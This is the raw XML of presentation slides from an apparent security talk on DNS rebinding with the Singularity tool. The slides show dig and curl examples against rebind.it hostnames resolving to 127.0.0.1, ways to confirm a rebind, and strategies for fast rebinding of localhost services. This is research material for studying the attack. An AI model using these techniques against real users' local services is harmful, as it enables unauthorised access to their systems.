                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>$ dig +noall +answer  s-35.185.206.165-127.0.0.1-123-fs-e.d.rebind.it s-35.185.206.165-127.0.0.1-123-fs-e.d.rebind.it. </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>0</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1600">
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t> IN A 127.0.0.1</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1600">
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Why not 1 second? We hoped 0 second would break stuff</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>[1]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>. It did not so far, as far as we know, it is a legitimate value[2].</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en"/>
            </a:br>
            <a:br>
              <a:rPr lang="en"/>
            </a:br>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>[1] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1100" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://mark.lindsey.name/2009/03/09/never-use-dns-ttl-of-zero-0/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1100"/>
              <a:t> </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en"/>
            </a:br>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>[2] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1100" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://tools.ietf.org/html/rfc2181#page-10</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>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5" name="Shape 335"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="336" name="Google Shape;336;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How Do We Know</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>We’ve Successfully Rebinded?</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="337" name="Google Shape;337;p4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Two</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> ways to differentiate the attacker server from the target service:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en"/>
            </a:br>
            <a:br>
              <a:rPr lang="en"/>
            </a:br>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>$ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t>curl -v </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>http://s-35.185.206.165-127.0.0.1-3504134792-fs-e.d.rebind.it:8080/</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Inconsolata"/>
              <a:ea typeface="Inconsolata"/>
              <a:cs typeface="Inconsolata"/>
              <a:sym typeface="Inconsolata"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>(...)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en">
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t>HTTP/1.1 200 OK</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en">
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t>X-Singularity-Of-Origin: t </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t># </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Custom HTTP Header </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>(...)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en">
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t>&lt;!--thisismytesttoken--&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t>&lt;!doctype html&gt;&lt;title&gt;(...) # </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Index Token</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Inconsolata"/>
              <a:ea typeface="Inconsolata"/>
              <a:cs typeface="Inconsolata"/>
              <a:sym typeface="Inconsolata"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="16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1" name="Shape 341"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="342" name="Google Shape;342;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Randomness and Catering for Potential Interference</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="343" name="Google Shape;343;p4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IPS/IDS/other i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>nterference via spurious DNS queries</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Challenge</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>: the environment IPS/IDS may make their own queries to the attacker domains in addition to the target, resulting in incorrect DNS/out of sequence DNS answers for the target.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Solution</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>: Use the random DNS rebinding strategy.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" marR="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Arial"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Slower technique in general (but you could get lucky!).</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7" name="Shape 347"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="348" name="Google Shape;348;p4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Need for Speed: DNS Rebinding in 3 Seconds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2" name="Shape 352"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="353" name="Google Shape;353;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Implementation Details Matter!</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="354" name="Google Shape;354;p49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1400675"/>
            <a:ext cx="8520600" cy="316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Rebinding </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>speed varies</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> based on a number of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>factors</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>OS implementation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>: Windows or Unix-like (Linux, macOS)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Browser vendor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>: IE/Edge, Firefox, Chrome/Chromium Edge, Safari</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Target specification</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>: local, remote</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>External factors</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>: Spurious DNS queries e.g. presence of IPS/IDS</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>DNS rebinding may take </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>40+ min</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>~3s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> on Edge depending on the strategy!</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>We </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng"/>
              <a:t>can automatically fingerprint to optimize</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> for speed in some conditions. More on this later!</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8" name="Shape 358"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="359" name="Google Shape;359;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Multiple Answers Rebinding Strategy with Targets 127.0.0.1 / 0.0.0.0</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="360" name="Google Shape;360;p50"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1400675"/>
            <a:ext cx="8520600" cy="316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time-varying (Singularity’s “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>first then second”)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> DNS rebinding technique is </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>~60 seconds</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> on all browsers except IE/Edge.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Multiple answers (respond with attacker and target addresses, then block attacker with ephemeral firewall rule) </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>is near instantaneous</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng"/>
              <a:t>127.0.0.1 works on Windows only</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>. </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>We got it to work on </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng"/>
              <a:t>Unix-y machines (Linux, macOS) with “0.0.0.0”.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>             </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Solid and fast DNS rebinding against all “localhost” services</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>.</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361" name="Google Shape;361;p50"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="476250" y="4029075"/>
            <a:ext cx="571500" cy="1809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5" name="Shape 365"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="366" name="Google Shape;366;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Multiple Answers </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Rebinding Strategy Illustrated</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="367" name="Google Shape;367;p51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="616500" y="142560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Target Browser</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="368" name="Google Shape;368;p51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6741300" y="142560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Attacker DNS </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp; Web Server</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>35.185.206.165</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="369" name="Google Shape;369;p51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="616500" y="4029300"/>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Target Service</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>127.0.0.1</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="370" name="Google Shape;370;p51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3418050" y="1141700"/>
            <a:ext cx="23079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DNS query rebind.it</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="371" name="Google Shape;371;p51"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="3124200" y="2638425"/>
            <a:ext cx="3162300" cy="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372" name="Google Shape;372;p51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3422775" y="1679663"/>
            <a:ext cx="2754000" cy="9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DNS A record response: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35.185.206.165</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>127.0.0.1</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="373" name="Google Shape;373;p51"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3119700" y="3232100"/>
            <a:ext cx="3214500" cy="1590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374" name="Google Shape;374;p51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3423600" y="2834300"/>
            <a:ext cx="25965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5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: 0s - HTTP request 1</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="accent5"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="375" name="Google Shape;375;p51"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="367" idx="2"/>
            <a:endCxn id="369" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1585800" y="2340000"/>
            <a:ext cx="0" cy="1689300"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="triangle"/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="142875" rotWithShape="0" algn="bl" dir="3900000" dist="28575">
              <a:srgbClr val="000000">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="376" name="Google Shape;376;p51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="261400" y="3570800"/>
            <a:ext cx="275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5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
